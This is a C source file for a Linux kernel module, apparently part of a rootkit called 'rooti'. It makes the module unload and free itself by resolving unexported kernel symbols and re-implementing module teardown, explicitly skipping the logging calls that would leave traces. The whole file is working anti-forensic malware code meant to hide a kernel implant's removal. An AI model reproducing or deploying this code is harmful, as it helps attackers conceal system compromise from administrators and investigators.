#include <linux/workqueue.h>
#include <linux/module.h>
#include <linux/list.h>
#include <linux/notifier.h>
#include <linux/async.h>
#include "unloading.h"
#include "../utils.h"

#define MODULE_REF_BASE 1

// Implemented in deallocate.S
extern void rooti_self_deallocate(struct work_struct *work);
DECLARE_WORK(rooti_self_deallocate_work, rooti_self_deallocate);

typedef void (*free_module_t)(struct module *);
free_module_t free_module_ptr = NULL;
struct module *this_module_ptr = THIS_MODULE;

static int __try_release_module_ref(struct module *mod)
{
	int ret = atomic_sub_return(MODULE_REF_BASE, &mod->refcnt);
	BUG_ON(ret < 0);
	if (ret) {
		ret = atomic_add_unless(&mod->refcnt, MODULE_REF_BASE, 0);   
    }
	return ret;
}

/*
	This function is similar to sys_delete_module() but without access to userspace memory and
	without some logging calls that leave traces of this module. It performs all teardown operations
	immediately and schedules the deallocation of the modules memory to a background workqueue.
*/
static int rooti_schedule_self_unloading(void) {
	ROOTI_RESOLVE_SYM_ADDR(struct mutex *, module_mutex, -ENOENT);
	ROOTI_RESOLVE_SYM_ADDR(struct blocking_notifier_head *, module_notify_list, -ENOENT);
	ROOTI_RESOLVE_FUNC_ADDR(klp_module_going, -ENOENT, void, struct module *);
	ROOTI_RESOLVE_FUNC_ADDR(ftrace_release_mod, -ENOENT, void, struct module *);

	mutex_lock(__module_mutex);

	// Check if by chance other modules depend on us (this should never happen in a non-debug build)
	if (!list_empty(&THIS_MODULE->source_list)) {
		mutex_unlock(__module_mutex);
		ROOTI_DEBUG("other modules depend on this module, cannot unload safely");
		return -EWOULDBLOCK;
	}

	// Checking if the module is during initialization or already dying
	if (THIS_MODULE->state != MODULE_STATE_LIVE) {
		mutex_unlock(__module_mutex);
		ROOTI_DEBUG("module is during initialization or already dying");
		return -EBUSY;
	}
	// Inlined try_stop_module() function
	if (__try_release_module_ref(THIS_MODULE) != 0) {
		mutex_unlock(__module_mutex);
		return -EWOULDBLOCK;
	}
	THIS_MODULE->state = MODULE_STATE_GOING;

	mutex_unlock(__module_mutex);
	blocking_notifier_call_chain(__module_notify_list, MODULE_STATE_GOING, THIS_MODULE);
	THIS_MODULE->exit();

	// ftrace & livepatch related cleanup
	__klp_module_going(THIS_MODULE);
	__ftrace_release_mod(THIS_MODULE);

	async_synchronize_full();

	// Call to free the module's own memory, there's no coming back after
	// the scheduled work completes. This operation needs to be scheduled to the background
	// because the service routine needs to be completed before we can get rid of the module.
    queue_work(system_long_wq, &rooti_self_deallocate_work);

	return 0;
}

int rooti_schedule_self_deletion()
{
	ROOTI_RESOLVE_SYM_ADDR(free_module_t, free_module, -ENOENT);
	free_module_ptr = __free_module;
	return rooti_schedule_self_unloading();
}